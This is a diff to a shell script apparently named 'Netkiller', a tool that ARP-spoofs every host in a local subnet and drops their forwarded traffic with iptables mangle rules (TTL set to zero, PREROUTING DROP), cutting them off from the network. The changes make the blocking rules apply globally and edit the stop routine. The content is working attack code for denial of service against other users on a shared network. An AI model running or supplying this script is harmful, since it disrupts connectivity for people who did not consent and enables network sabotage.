@@ -26,8 +26,8 @@ fi
 # Enable IP forwarding and blocking rules
 echo 1 > /proc/sys/net/ipv4/ip_forward
 echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
-iptables -P FORWARD DROP
-iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -t mangle -A FORWARD -j TTL --ttl-set 0
+iptables -t mangle -A PREROUTING -j DROP
 ulimit -u 8192
 ulimit -n 65535
 sysctl -w net.ipv4.neigh.default.gc_thresh3=8192
@@ -39,10 +39,8 @@ cat > /bin/netkiller-stop << 'EOF'
 echo " "
 echo "Netkiller is Stop..."
 echo " "
-iptables -P FORWARD ACCEPT
 iptables -t mangle -F FORWARD
-iptables -t mangle -F PREROUTING 
-iptables -F FORWARD
+iptables -t mangle -F PREROUTING
 pkill -f arpspoof
 pkill arpspoof
 echo " "
@@ -140,9 +138,7 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
     for ((i=START; i<=END; i++)); do
         TARGET_IP=$(int2ip "$i")
         ( arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 ) &
-          iptables -t mangle -A FORWARD -s "$TARGET" -j TTL --ttl-set 0
-          iptables -t mangle -A PREROUTING -s "$TARGET" -j DROP
-          done
+   done
 fi
 echo "Netkiller kill all the possible hosts in $TARGET_SUBNET"
 echo " "
